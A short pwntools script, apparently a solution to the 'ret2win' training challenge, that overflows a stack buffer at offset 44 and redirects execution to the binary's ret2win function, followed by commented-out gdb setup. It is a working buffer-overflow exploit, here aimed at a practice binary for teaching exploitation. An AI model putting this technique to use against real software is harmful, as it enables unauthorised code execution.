from pwn import *

filepath = ""   #use your filepath here
elf = context.binary = ELF(filepath, checksec=False)
p = process()

offset = 44
payload = flat(
    asm('nop') * offset,
    elf.symbols['ret2win'],
)

# f = open("payload", "wb")
# f.write(payload)
p.sendlineafter('>', payload)
p.interactive()


















# gdbscript = '''
# init-peda
# continue
# '''.format(**locals())

# exe = "./ret2win32"
# elf = context.binary = ELF(exe,checksec=False)
# context.log_level = 'info'
# context.delete_corefiles = True

# def start(argv = [], *a, **kw):
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe] + argv, *a, **kw)


######EXPLOT HERE##########

    




